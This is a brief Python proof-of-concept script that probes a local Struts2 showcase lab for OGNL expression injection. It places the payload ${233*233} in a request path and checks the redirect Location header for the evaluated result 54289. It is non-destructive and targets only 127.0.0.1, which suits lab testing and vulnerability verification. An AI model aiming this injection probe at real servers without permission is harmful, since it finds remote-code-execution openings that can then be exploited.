"""Non-destructive proof-of-concept probe: arithmetic OGNL evaluation only."""
import sys
from urllib.error import HTTPError, URLError
from urllib.request import Request, urlopen

url = 'http://127.0.0.1:8080/struts2-showcase/$%7B233*233%7D/actionChain1.action'
try:
    with urlopen(Request(url), timeout=8) as response:
        code, location = response.status, response.headers.get('Location', '')
except HTTPError as exc:
    code, location = exc.code, exc.headers.get('Location', '')
except URLError as exc:
    print('Lab unavailable:', exc)
    sys.exit(2)
print('HTTP status:', code)
print('Location:', location)
print('Arithmetic OGNL evaluation observed:', '54289' in location)
